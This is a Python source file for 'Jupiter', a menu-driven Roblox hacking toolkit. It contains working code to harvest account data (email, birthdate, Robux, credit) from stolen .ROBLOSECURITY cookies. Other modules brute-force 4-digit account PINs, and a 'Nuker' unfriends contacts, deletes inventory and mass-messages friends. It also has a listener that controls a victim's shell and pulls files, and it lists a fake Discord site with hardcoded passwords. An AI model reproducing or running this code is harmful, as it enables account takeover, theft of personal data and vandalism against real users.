# Closed for public untill its going free
#        _             _ _            
#      | |           (_) |           
#      | |_   _ _ __  _| |_ ___ _ __ 
#  _   | | | | | '_ \| | __/ _ \ '__|
# | |__| | |_| | |_) | | ||  __/ |   
#  \____/ \__,_| .__/|_|\__\___|_|   
#             | |                   
#             |_|                  

#

try:
    from pyisemail import is_email
    from pystyle import Colorate, Colors, Add, Center, Write, Anime, Box
    import requests
    import threading
    import time
    import os
    import subprocess
    from termcolor import cprint
    import random
    import socket
    from rich.console import Console
except:
    try:
        import pip
    except ImportError:
        os.system("")
        print("[", end="")
        print("] ", end="")
        print("\033[31m" + "[ERROR] Pip not installed. Installing now...")
        subprocess.call(
            "curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py", shell=True
        )
        time.sleep(5)
        os.system("get-pip.py")
    print("[", end="")
    print("] ", end="")
    print("\033[31m" + "[ERROR] Packages not installed. Installing now...")
    subprocess.call("pip install termcolor", shell=True)
    subprocess.call("pip install requests", shell=True)
    subprocess.call("pip install pystyle", shell=True)
    subprocess.call("pip install os", shell=True)
    subprocess.call("pip install time", shell=True)
    subprocess.call("pip install random", shell=True)
    subprocess.call("pip install pyisemail", shell=True)
    subprocess.call("pip install socket", shell = True)
    subprocess.call("pip install Console", shell = True)
finally:
    from pyisemail import is_email
    from pystyle import Colorate, Colors, Add, Center, Write, Anime, Box
    import requests
    import socket
    import threading
    import time
    import os
    import subprocess
    from termcolor import cprint
    import random
    from rich.console import Console

#########################################################################################################################################
#########################################################################################################################################
#########################################################################################################################################
#########################################################################################################################################
    
settingsAll = requests.get("https://raw.githubusercontent.com/VZXdev/Jupiter/refs/heads/main/license")



file = "checked_cookies.txt"

def getBanner():
	bannerText = """

"""
	
	bannerLogo = """
             ____.            .__  __                
            |    |__ ________ |__|/  |_  ___________ 
            |    |  |  \____ \|  \   __\/ __ \_  __ |
        /\__|    |  |  /  |_> >  ||  | \  ___/|  | \/
        \________|____/|   __/|__||__|  \___  >__|   
                       |__|                 \/       

"""

	banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

def getChecker():
	bannerText = """

"""
	
	bannerLogo = """
             ____.            .__  __                
            |    |__ ________ |__|/  |_  ___________ 
            |    |  |  \____ \|  \   __\/ __ \_  __ |
        /\__|    |  |  /  |_> >  ||  | \  ___/|  | \/
        \________|____/|   __/|__||__|  \___  >__|   
                       |__|                 \/                    
"""

	banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

os.system("cls")
print('')
Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
print(getBanner())
import requests
import re
import string
import time
import os
from pystyle import Colorate, Colors, Add, Center, Write


year = time.localtime().tm_year
day = time.localtime().tm_mday
month = time.localtime().tm_mon
def getCracker():
	bannerText = f"""

"""
	
	bannerLogo = """
             ____.            .__  __                
            |    |__ ________ |__|/  |_  ___________ 
            |    |  |  \____ \|  \   __\/ __ \_  __ |
        /\__|    |  |  /  |_> >  ||  | \  ___/|  | \/
        \________|____/|   __/|__||__|  \___  >__|   
                       |__|                 \/         
"""

	banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner


def check_version(version):
    Write.Print(f"Checking for updates...\n", Colors.orange, interval=0.0025)
    try:
        response = requests.get("https://raw.githubusercontent.com/VZXdev/Jupiter/refs/heads/main/Version.txt")
        logina = requests.get("https://raw.githubusercontent.com/VZXdev/Jupiter/refs/heads/main/login")
        latest_version = response.text.strip()
        islogin = logina.text.strip()
        if latest_version != version:
            Write.Print(f"New version available. Please update to version {latest_version} from the Github! \n", Colors.red, interval=0.0025)
            os.system("pause")
        else:
            Write.Print(f"Newest version!\n", Colors.green, interval=0.0025)
            if islogin == "False":
                time.sleep(2)
                os.system("cls")
                print('')
                print(getBanner())
                GetNumber()
            elif islogin == "True":
                login()

            

    except requests.exceptions.RequestException:
        pass
    except:
        pass

version = "1.4.0"

def BuyAll():
    cookie = Write.Input(f"Cookie to free-item-buyer: ", Colors.green_to_cyan, interval=0.0025)
    session = requests.Session()
    session.cookies.update({".ROBLOSECURITY": cookie})

    console = Console(highlight=False)


    def cprint(color: str, content: str) -> None:
        console.print(f"[ [bold {color}]>[/] ] {content}")


    def fetch_items() -> None:
        result = {}
        cursor = ""

        while cursor is not None:
            req = session.get(
                f"https://catalog.roblox.com/v1/search/items/details?category=All&creatorTargetId=1&limit=30&maxPrice=0&cursor={cursor}"
            )
            res = req.json()

            if req.status_code == 429:
                cprint("red", "Rate limited. Waiting 20 seconds")
                time.sleep(20)
                continue

            for item in res.get("data", []):
                item_name = item.get("name")
                result[item_name] = item.get("productId")
                cprint("blue", f"Found {item_name}")

            cursor = res.get("nextPageCursor")

        return result


    def purchase(name: str, product_id: int) -> None:
        req = session.post("https://auth.roblox.com/v2/login")
        csrf_token = req.headers["x-csrf-token"]

        while True:
            req = session.post(
                f"https://economy.roblox.com/v1/purchases/products/{product_id}",
                json={"expectedCurrency": 1, "expectedPrice": 0, "expectedSellerId": 1},
                headers={"X-CSRF-TOKEN": csrf_token},
            )

            if req.status_code == 429:
                cprint("red", "Rate limited. Waiting 60 seconds")
                time.sleep(60)
                continue

            res = req.json()
            if "reason" in res and res.get("reason") == "AlreadyOwned":
                cprint("yellow", f"{name} is already owned")
                return

            cprint("green", f"Successfully purchased {name}")
            return


    def main() -> None:
        free_items = fetch_items()
        for name, product_id in free_items.items():
            purchase(name, product_id)


    main()

def bruteForc():
    IP = socket.gethostbyname("localhost")
    PORT = 6969

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((IP, PORT))

    s.listen(10)

    conn, cliente = s.accept()

    welcome = conn.recv(1024)
    print(welcome.decode("utf-8"))

    class Shell:
        def __init__(self, SHELL_BT):
            self.SHELL_BT = SHELL_BT

        def verifications(SHELL_BT):
            verifications = ["shell", "exit", "recv archive", "help"]

            if(SHELL_BT == verifications[0]):
                while True:
                    shell = Shell.command()
                    if shell == "exit":
                        break

            if(SHELL_BT == verifications[1]):
                conn.send("exit".encode())
                conn.close()
                s.close()
                exit()

            if(verifications[2] in SHELL_BT):
                Shell.recv_archive(SHELL_BT)

            if(not SHELL_BT in verifications):
                if(verifications[2] in SHELL_BT):
                    return(" ")

                os.system(SHELL_BT)
                print("\n")

            if(SHELL_BT == verifications[3]):
                print("\033[1;32mversion 0.1\n\nCommands:\n\nhelp			Print this message helper\nshell			Opens the victim shell\nrecv archive		Chose an archive of victim and recv to your computer\nexit		Exit the program\n\n\nUsage Method:\n\nrecv archive		recv archive <filename_client> <filename_server>\n\n\n\033[0;0m")

        def home():
            conn.send("home".encode())
            HOME = conn.recv(1024).decode("utf-8")

            return(HOME)

        def command():
            HOME = Shell.home()
            SHELL = str(input("%s>> "%(HOME)))
            if(SHELL == "exit"):
                SHELL = ""
                return("exit")

            conn.send("command".encode())
            time.sleep(1)
            conn.send(SHELL.encode())
            print(conn.recv(1024).decode("utf-8"))

        def recv_archive(filenames):
            filename = filenames[13:]
            num_f = 0

            filename_client = ""
            for i in range(len(filename)):
                if(filename[num_f] != " "):
                    filename_client += filename[num_f]
                    num_f += 1

            filename_server = filename[num_f+1:]
            conn.send("filesend".encode())
            time.sleep(1)

            conn.send(filename_client.encode())
            time.sleep(1)

            #filesize = conn.recv(1024)
            #sleep(1)

            filebyte = conn.recv(1024)
            print(filebyte)

            with open(filename_server, "wb") as infile:
                #infile.write(filesize)
                infile.write(filebyte)

    while True:
        try:
            shell_btnt = str(input("\033[31m\033[1mKSF\033[31m>>\033[1;32m "))
            Shell.verifications(shell_btnt)

        except KeyboardInterrupt:
            conn.close()
            s.close()
            exit()

def Pin_Cracker():
    os.system("cls")
    print('')
    print(getCracker())
    print('')
    cookie = Write.Input('Enter your cookie below:', Colors.green, interval=0.0025)
    os.system("cls")
    print('')

    url = 'https://auth.roblox.com/v1/account/pin/unlock'
    token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
    xcrsf = (token.headers['x-csrf-token'])
    header = {'X-CSRF-TOKEN': xcrsf}

    i = 0

    for i in range(9999):
        try:
            pin = str(i).zfill(4)
            payload = {'pin': pin}
            r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
            if 'unlockedUntil' in r.text:
                print(f'Pin Cracked! Pin: {pin}')
            
            elif 'Too many requests made' in r.text:
                
                print('  Ratelimited, trying again in 60 seconds..')
                time.sleep(60)
                
            elif 'Authorization' in r.text:
                
                print('  Error! Is the cookie valid?')
                break
            
            elif 'Incorrect' in r.text:
                print(f"  Tried: {pin} , Incorrect!")
                time.sleep(10)  
            elif 'MethodNotAllowed' in r.text:
                Write.Print('Method Not Allowed. Sorry we cant do anything\n', Colors.green,  interval=0.0025)
        except:
            print('  Error!')

def Nucker():
    def getXsrf(cookie):
        xsrfRequest = requests.post(
            "https://auth.roblox.com/v2/logout", cookies={".ROBLOSECURITY": cookie}
        )
        return xsrfRequest.headers["x-csrf-token"]


    def clear():
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")


    class Nuke:
        def __init__(self):
            self.headers = None
            self.cookie = None
            self.start()

        def flash(self):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Flashing....", "magenta")
            print("[", end="")
            cprint(" NUKER ", "yellow", end="")
            print("] ", end="")
            cprint("Press Ctrl + C to stop", "yellow")
            try:
                while True:
                    requests.patch(
                        "https://accountsettings.roblox.com/v1/themes/user",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                        data={"themeType": "Light"},
                    )
                    requests.patch(
                        "https://accountsettings.roblox.com/v1/themes/user",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                        data={"themeType": "Dark"},
                    )
            except KeyboardInterrupt:
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                for i in "Done Nuking...":
                    time.sleep(0.1)
                    cprint(i, "magenta", end="", flush=True)

        def changeLanguage(self):
            while True:
                requests.post(
                    "https://locale.roblox.com/v1/locales/set-user-supported-locale",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                    data={"supportedLocaleCode": "ja_jp"},
                )
                requests.post(
                    "https://locale.roblox.com/v1/locales/set-user-supported-locale",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                    data={"supportedLocaleCode": "ko_kr"},
                )

        def messageAll(self, message):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Messaging friends....", "magenta")
            conversations = requests.get(
                "https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
            ).json()
            for conversation in conversations:
                requests.post(
                    "https://chat.roblox.com/v2/send-message",
                    data={"conversationId": conversation["id"], "message": message},
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                )
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                cprint(f"Sent message to {conversation['id']}", "magenta")

        def removeItems(self):
            items = requests.get(
                f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
            ).json()["Data"]["Items"]
            for item in items:
                time.sleep(4)
                id = item["Item"]["AssetId"]
                response = requests.post(
                    "https://www.roblox.com/asset/delete-from-inventory",
                    data={"assetId": str(id)},
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                )
                if response.status_code == 429:
                    time.sleep(10)
                    response = requests.post(
                        "https://www.roblox.com/asset/delete-from-inventory",
                        data={"assetId": id},
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                    )
                    print("[", end="")
                    cprint(" NUKER ", "magenta", end="")
                    print("] ", end="")
                    cprint(f"Removed {id} from user's inventory", "magenta")
                else:
                    print("[", end="")
                    cprint(" NUKER ", "magenta", end="")
                    print("] ", end="")
                    cprint(f"Removed {id} from user's inventory", "magenta")
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Removed all items from user's inventory", "magenta")
            time.sleep(1)

        def unfriend(self):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Unfriending friends....", "magenta")
            friends = requests.get(
                f"https://friends.roblox.com/v1/users/{self.userid}/friends",
                cookies={".ROBLOSECURITY": str(self.cookie)},
            ).json()["data"]
            friendIds = [friend["id"] for friend in friends]
            for i in friendIds:
                time.sleep(0.1)
                print(
                    requests.post(
                        f"https://friends.roblox.com/v1/users/{i}/unfriend",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                    ).text
                )
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                cprint(f"Unfriended {i}!", "magenta")
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Unfriended All!", "magenta")

        def check(self):
            print("[", end="")
            cprint("NUKER", "magenta", end="")
            print("] ", end="")
            cprint("Enter Your Cookie Below:", "magenta")
            self.cookie = input("> ")
            # self.cookie = "F"
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Enter Your mass dm message below:", "magenta")
            self.message = input("> ")
            return requests.get(
                "https://chat.roblox.com/v2/get-unread-conversation-count",
                cookies={".ROBLOSECURITY": str(self.cookie)},
            )

        def start(self):
            os.system("")
            check = self.check()
            if check.status_code == 200:
                self.headers = {"X-CSRF-TOKEN": getXsrf(self.cookie)}
                userdata = requests.get(
                    "https://users.roblox.com/v1/users/authenticated",
                    cookies={".ROBLOSECURITY": self.cookie},
                ).json()  # get user data
                self.userid = userdata["id"]  # user id
                clear()
                threading.Thread(target=self.flash).start()
                threading.Thread(target=self.unfriend).start()
                threading.Thread(target=self.changeLanguage).start()
                threading.Thread(target=self.removeItems).start()
                threading.Thread(target=self.messageAll, args=(self.message,)).start()
                Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
                os.system("cls")
                print('')
                print(getBanner())
                GetNumber()
            else:
                print(check.status_code)
                print("[", end="")
                cprint(" ERROR ", "red", end="")
                print("] ", end="")
                cprint("Invalid Cookie", "red")
                time.sleep(1.4)
                clear()
                print(getBanner())
                self.check()
    Nuke()
    Write.Input("[UNKNOW ERROR] Press any key to exit", Colors.red, interval=0.0025)
    os.system("cls")
    print('')
    print(getBanner())
    GetNumber()


def GruupFind():
    def groupfinder(suma):
        try:
            id = random.randint(1000000, 1150000)
            r = requests.get(f"https://www.roblox.com/groups/group.aspx?gid={id}", timeout=30)
            if 'owned' not in r.text:
                re = requests.get(f"https://groups.roblox.com/v1/groups/{id}", timeout=30)
                if re.status_code != 429:
                    if 'errors' not in re.json():
                        if 'isLocked' not in re.text and 'owner' in re.text:
                            if re.json()['publicEntryAllowed'] == True and re.json()['owner'] == None:
                                Write.Print(f"[+] Hit: {id}\n", Colors.green_to_cyan, interval=0.0025)
                                suma+=1
                            else:
                                Write.Print(f"[-] No Entry: {id}\n", Colors.green_to_cyan, interval=0.0025)
                        else:
                            Write.Print(f"[-] Group Locked: {id}\n", Colors.green_to_cyan, interval=0.0025)
                else:
                    Write.Print(f"[-] Group API Rate Limited\n", Colors.green_to_cyan, interval=0.0025)
            else:
                Write.Print(f"[-] Group Already Owned: {id}\n", Colors.green_to_cyan, interval=0.0025)
        except:
            pass
            return suma


    os.system("cls")
    print('')

    Write.Print("""

             ____.            .__  __                
            |    |__ ________ |__|/  |_  ___________ 
            |    |  |  \____ \|  \   __\/ __ \_  __ |
        /\__|    |  |  /  |_> >  ||  | \  ___/|  | \/
        \________|____/|   __/|__||__|  \___  >__|   
                       |__|                 \/            
                                            
                           
""", Colors.green_to_cyan, interval=0.0025)

    inputa =  Write.Input("[-] How many repeats: ", Colors.green_to_cyan, interval=0.0025)
    threads = int(inputa)
    suma = 0
    while threads!=0:
        groupfinder(suma)
        threads = threads-1

    Write.Input(f"Sum of the resulting groups: {suma}. Press any key to exit", Colors.orange, interval=0.0025)
    os.system("cls")
    print('')
    print(getBanner())
    GetNumber()

def GetNumber():
    Printing = Colorate.Vertical(Colors.green_to_blue, Center.XCenter("""[1] Cheats (Kefir sploit);            [6] Email validator;
[2] Cookie checker;                   [7] Nucker;
[3] Discord fake site;                [8] BruteForcer;
[4] Roblox Pin cracker;               [9] free-item-buyer
[5] Group finder                      [10] Soon..."""), 1)
    print(Printing)
    Number = Write.Input("Enter number: ", Colors.green_to_blue, interval=0.0025)
    if Number == "1":
        Write.Print("Waiting for open file...\n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        dol = 0
        while dol != 10:
            Write.Print("[Error] accets not downloaded. Redownload files in 2 sec...\n", Colors.red, interval=0.0025)
            time.sleep(2)
            Write.Print("Waiting for open file...\n", Colors.green_to_cyan, interval=0.0025)
            dol +=1
        a = 0
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
        Write.Print("[Error] ATTENTION! YOUR DEVICE DOES NOT SUPPORT KEFIRSPLOIT! PLEASE GO TO UBANTU!\n", Colors.red, interval=0.0025)
    elif Number == "2":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        os.system("cls")
        print('')
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        print(getChecker())
        cookie = Write.Input(f"Cookie to check: ", Colors.green_to_cyan, interval=0.0025)
        # cookie = ""
        check(cookie)
    elif Number == "3":
        Write.Print("Our servers off, please wait\n", Colors.green_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == "4":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        Pin_Cracker()
        a = 0
    elif Number == "5":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        GruupFind()
        a = 0
    elif Number == "6":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        email_valid()
        a = 0
    elif Number == "7":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        Nucker()
        a = 0
    elif Number == "8":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        YesNo = Write.Input("Are you ready to launch Brute forcer? Takes computer power and connects to server (Y/n): ", Colors.green_to_blue, interval=0.0025)
        if YesNo == "Y":
            time.sleep(2)
            os.system("cls")
            print('')
            print(getBanner())
            bruteForc()
        elif YesNo == "n":
            time.sleep(2)
            os.system("cls")
            print('')
            print(getBanner())
            GetNumber()
        a = 0
    elif Number == "9":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        BuyAll()
        a = 0

def email_valid():
    gmailfilefolder = os.path.dirname(__file__)
    gmailsfile = (gmailfilefolder + "\gmails.txt")
    gmail = open(gmailsfile).read().splitlines()
    validcount = 0
    invalidcount = 0
    print(getBanner())


    if len(gmail) > 0:
        Write.Print(str(len(gmail)) + " Mail(s) Found\n", Colors.green_to_cyan, interval=0.0025)
        Write.Print("#######################################################################", Colors.green_to_cyan, interval=0.0025)
        print(" ")
        pathnameforvalid = os.path.join(os.path.dirname(__file__), "validmails.txt")
        newfileforvalid = open(pathnameforvalid, "w")
        newfileforvalid.truncate(0)
        pathnameforinvalid = os.path.join(os.path.dirname(__file__), "invalidmails.txt")
        newfileforinvalid = open(pathnameforinvalid, "w")
        newfileforinvalid.truncate(0)
        for line in gmail:
            address = str(line)
            bool_result_with_dns = is_email(address, check_dns=True)
            if bool_result_with_dns == True:
                newfileforvalid.write(str(line) + "\n")
                validcount += 1
                Write.Print(f"[Valid]: " + str(line) + "\n", Colors.green, interval=0.0025)
            else:
                newfileforinvalid.write(str(line) + "\n")
                invalidcount += 1
                Write.Print(f"[Invalid]: " + str(line)  + "\n", Colors.red, interval=0.0025)
        Write.Print(f"Valid Mails(s): " + str(validcount) + "\nInvalid Mails(s): " + str(invalidcount) + "\n", Colors.orange, interval=0.0025)
        Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
        os.system("cls")
        print('')
    else:
        Write.Print("No mail(s) found.", Colors.green_to_cyan, interval=0.0025)
        Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()

def check(cookie):

  Emmail = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
  email = Emmail['verified']
  EmailName = Emmail['emailAddress']
  Write.Print(f"[Process] Get email...\n", Colors.orange, interval=0.0025)
  credit = requests.get("https://billing.roblox.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
  Write.Print(f"[Process] Get credit...\n", Colors.orange, interval=0.0025)
  userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
  birthday = requests.get("https://accountinformation.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
  Write.Print(f"[Process] Get birthday...\n", Colors.orange, interval=0.0025)
  userid = userdata['id'] #user id
  followers = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
  Write.Print(f"[Process] Get followers...\n", Colors.orange, interval=0.0025)
  Write.Print(f"[Process] Get userId...\n", Colors.orange, interval=0.0025)

  transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
  pending = transactions['pendingRobuxTotal']
  Write.Print(f"[Process] Get Pending...\n", Colors.orange, interval=0.0025)
  stipends = transactions['premiumStipendsTotal']
  Write.Print(f"[Process] Get stipends...\n", Colors.orange, interval=0.0025)
  devEx = transactions['developerExchangeTotal']
  Write.Print(f"[Process] Get DevEX...\n", Colors.orange, interval=0.0025)
  groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
  groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
  groupFunds = 0
  for i in groupIds:
    groupFunds += int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
  creationDate = requests.get(f'https://users.roblox.com/v1/users/{userid}').json()['created']
  display = userdata['displayName'] #display name
  Write.Print(f"[Process] Get Display...\n", Colors.orange, interval=0.0025)
  username = userdata['name'] #username
  Write.Print(f"[Process] Get Username...\n", Colors.orange, interval=0.0025)
  robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
  robux = robuxdata['robux'] #get robux balance
  Write.Print(f"[Process] Get Robux...\n", Colors.orange, interval=0.0025)
  #does the user have premium?
  premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
  #get rap
  rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
  while rap_dict['nextPageCursor'] != None:
      rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
  rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
  birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
  thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
  image_url = thumbnail["data"][0]["imageUrl"]
  pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
  pin_bool = pindata["isEnabled"] #does the user have a pin
  #make an embed #does the user have a pin
  #make an embed
  Write.Print(f"Username: {username}, url= https://roblox.com/users/{userid}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"########## {username} ##########\n")
  Write.Print(f"Display name: {display}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"User ID: {userid}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"UserID: {userid}\n")
  Write.Print(f"Robux: {robux}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Robux: {robux}\n")
  Write.Print(f"Has pin: {pin_bool}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Has pin: {pin_bool}\n")
  if pin_bool == True:
    Write.Print(f"[advice]: Use Jupiter pin cracker!\n", Colors.orange, interval=0.0025)
  Write.Print(f"Premium: {premiumbool}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Premium: {premiumbool}\n")
  Write.Print(f"Credit: {credit}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Credit: {credit}\n")
  Write.Print(f"Birthday: {birthdate}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"birthday: {birthdate}\n")
  Write.Print(f"Groups: {groupIds}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Groups: {groupIds}\n")
  Write.Print(f"Rap: {rap}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Rap: {rap}\n")
  Write.Print(f"Is email verified: {email}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Email verified: {email}\n")
  Write.Print(f"Email: {EmailName}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Email name: {EmailName}\n")
  Write.Print(f"group founds: {groupFunds}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Group founds: {groupFunds}\n")
  Write.Print(f"Dev exchange: {devEx}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"DEVx exchange: {devEx}\n")
  with open(file, 'a+') as f:
   f.write(f"followers: {followers}\n")
  Write.Print(f"Pending: {pending}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Pending: {pending}\n")
  Write.Print(f"Premium Stipends: {stipends}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Premium Stipends: {stipends}\n")
  Write.Print(f"Followers: {followers}\n", Colors.green_to_cyan, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Display name: {display}\n")
  with open(file, 'a+') as f:
   f.write(f"By JealLeal. saved on: {day}.{month}.{year}\n\n")
  cookie = Write.Input(f"Press any key to exit", Colors.orange, interval=0.0025)
  #dualhook
  Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
  os.system("cls")
  print('')
  print(getBanner())
  GetNumber()



def login():
    Write.Print("Please login... \n", Colors.green_to_blue, interval=0.0025)
    User = Write.Input("Username: ", Colors.green_to_blue, interval=0.0025)
    Pas = Write.Input("Password: ", Colors.green_to_blue, interval=0.0025)
    if User == "JealLeal" and Pas == "Vitalik228":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        print(getBanner())
        GetNumber()
    elif User == "Guest" and Pas == "123":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        GetNumber()
    elif User == "etagemat" and Pas == "etagemat":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        GetNumber()
    else:
        Write.Print("Incorrect login or password!", Colors.green_to_blue, interval=0.0025)
        time.sleep(3)
        os.system("cls")
        print('')
        print(getBanner())
        login()

check_version(version)


